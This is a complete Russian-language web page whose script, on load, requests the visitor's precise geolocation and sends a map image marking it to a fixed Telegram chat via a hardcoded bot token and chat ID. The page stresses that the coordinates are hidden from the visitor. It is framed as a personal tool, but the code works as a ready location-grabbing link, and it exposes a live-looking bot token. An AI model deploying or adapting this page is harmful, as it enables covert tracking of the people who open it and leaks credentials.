<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Отправка карты в Telegram (координаты скрыты)</title>
    <style>
        body {
            font-family: system-ui, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 24px;
            padding: 24px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
            text-align: center;
        }
        h1 { font-size: 1.8rem; }
        .status {
            background: #e9ecef;
            border-radius: 16px;
            padding: 16px;
            margin: 20px 0;
            font-family: monospace;
            font-size: 0.85rem;
            text-align: left;
            white-space: pre-wrap;
            word-break: break-word;
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 40px;
            padding: 12px 24px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover { background: #006699; }
        .note {
            font-size: 0.8rem;
            color: #6c757d;
            margin-top: 20px;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>🗺️ Карта → Telegram</h1>
    <p>Координаты не будут показаны текстом — только картинка с меткой.</p>
    <div class="status" id="status">⏳ Ожидание...</div>
    <button id="sendBtn">📍 Отправить карту заново</button>
    <div class="note">
        ⚠️ <strong>Важно:</strong><br>
        1. Напишите боту <code>/start</code> до открытия этой страницы.<br>
        2. Замените <code>CHAT_ID</code> в коде на свой личный ID (см. инструкцию ниже).<br>
        3. Карта генерируется через OpenStreetMap — бесплатно, без ключа.
    </div>
</div>

<script>
    // ---------- НАСТРОЙКИ (ОБЯЗАТЕЛЬНО ИЗМЕНИТЕ!) ----------
    const BOT_TOKEN = "8876131918:AAF_P-YrCuMJwt8tJVsVh5X_i6EVJ3mOvo0";
    // 👇 ЗАМЕНИТЕ НА ВАШ ЛИЧНЫЙ ID (НЕ ID бота!)
    const CHAT_ID = 550519891;   // например, 12345678
    
    const statusDiv = document.getElementById('status');
    // -----------------------------------------------------

    function log(msg, isError = false) {
        const div = document.createElement('div');
        div.textContent = msg;
        div.style.color = isError ? '#dc3545' : '#28a745';
        div.style.marginTop = '5px';
        statusDiv.appendChild(div);
        statusDiv.scrollTop = statusDiv.scrollHeight;
        console.log(isError ? '❌' : '✅', msg);
    }

    function clearStatus() { statusDiv.innerHTML = ''; }

    // Отправка статической карты (изображения) без текста координат
    async function sendMapImage(latitude, longitude) {
        // Создаём URL карты OSM с красной меткой
        // Размер: 600x300, зум 15, маркер в центре
        const mapUrl = `https://staticmap.openstreetmap.de/staticmap.php?center=${latitude},${longitude}&zoom=15&size=600x300&markers=${latitude},${longitude},red-push`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json; charset=utf-8' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    photo: mapUrl,
                    // Подпись НЕ содержит координаты — только дата или пусто
                    caption: `🗺️ Ваша геопозиция\n🕒 ${new Date().toLocaleString('ru-RU')}`
                })
            });

            const result = await response.json();
            if (result.ok) {
                log(`✅ Карта отправлена! Координаты не видны в сообщении.`);
            } else {
                log(`❌ Ошибка Telegram: ${result.description} (код ${result.error_code})`, true);
                if (result.error_code === 403) {
                    log(`💡 Проверьте: вы написали боту /start? chat_id — это ваш личный ID?`, true);
                }
            }
        } catch (err) {
            log(`❌ Ошибка сети: ${err.message}`, true);
        }
    }

    function getLocation() {
        clearStatus();
        log("🔍 Запрос геолокации...");
        if (!navigator.geolocation) {
            log("❌ Браузер не поддерживает геолокацию", true);
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude, accuracy } = position.coords;
                log(`📍 Получены координаты (точность ${Math.round(accuracy)} м)`);
                log(`🖼️ Генерируем карту и отправляем...`);
                // Координаты НЕ выводятся в лог для пользователя, но технически видны в консоли
                sendMapImage(latitude, longitude);
            },
            (error) => {
                let msg = "";
                switch (error.code) {
                    case error.PERMISSION_DENIED: msg = "Доступ к геолокации запрещён."; break;
                    case error.POSITION_UNAVAILABLE: msg = "Местоположение не определено."; break;
                    case error.TIMEOUT: msg = "Таймаут получения координат."; break;
                    default: msg = "Неизвестная ошибка.";
                }
                log(`❌ ${msg}`, true);
            },
            { enableHighAccuracy: true, timeout: 15000 }
        );
    }

    // Запуск при загрузке
    window.addEventListener('load', () => {
        log("Страница загружена. Запрашиваем геолокацию...");
        getLocation();
    });

    document.getElementById('sendBtn').addEventListener('click', getLocation);
</script>
</body>
</html>
